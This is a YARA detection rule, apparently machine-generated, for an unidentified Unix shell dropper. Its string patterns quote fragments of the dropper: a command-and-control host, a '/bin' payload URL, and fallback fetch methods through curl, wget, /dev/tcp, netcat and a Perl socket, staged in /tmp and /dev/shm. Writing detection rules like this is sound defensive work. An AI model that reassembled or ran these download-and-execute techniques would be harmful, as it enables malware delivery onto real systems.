rule SCRIPT_Dropper_Unknown_ForgeAuto_54b789ad
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "54b789adb673ab56eef5053d6af05152cb96614e0a43d992701d7a26956fd4c9"
        yarahub_uuid = "1685b67e-df1a-4dba-a5f5-b2e776a96e9a"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "f8501c9956bfabc8d33ce3dc02f45636"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "if command -v curl >/dev/null 2>&1; then" ascii
        $s1 = "if command -v wget >/dev/null 2>&1; then" ascii
        $s2 = "C2=\"c2.teamzeroday.net\"" ascii
        $s3 = "B1=\"http://c2.teamzeroday.net/bin\"" ascii
        $s4 = "TAG=\"${1:-manta}\"" ascii
        $s5 = "cd /tmp      2>/dev/null || \\" ascii
        $s6 = "cd /dev/shm  2>/dev/null || \\" ascii
        $s7 = "cd /var/tmp  2>/dev/null || \\" ascii
        $s8 = "cd /var/run  2>/dev/null || \\" ascii
        $s9 = "if (exec 3<>/dev/tcp/$C2/$CP) 2>/dev/null; then" ascii
        $s10 = "printf 'GET /bin/%s HTTP/1.0\\r\\nHost: %s\\r\\n\\r\\n' \"$F\" \"$C2\" >&3" ascii
        $s11 = "if command -v nc >/dev/null 2>&1; then" ascii
        $s12 = "printf 'GET /bin/%s HTTP/1.0\\r\\nHost: %s\\r\\n\\r\\n' \"$F\" \"$C2\" | \\" ascii
        $s13 = "nc $C2 $CP 2>/dev/null | sed '1,/^\\r*$/d' > .q" ascii
        $s14 = "if command -v perl >/dev/null 2>&1; then" ascii
        $s15 = "perl -MIO::Socket::INET -e '" ascii
        $s16 = "my $s = IO::Socket::INET->new(\"'\"$C2\"':'\"$CP\"'\") or exit 1;" ascii
        $s17 = "print $s \"GET /bin/'\"$F\"' HTTP/1.0\\r\\nHost: '\"$C2\"'\\r\\n\\r\\n\";" ascii
        $s18 = "local $/; my $r = <$s>;" ascii
        $s19 = "' > .q 2>/dev/null" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s3)
}
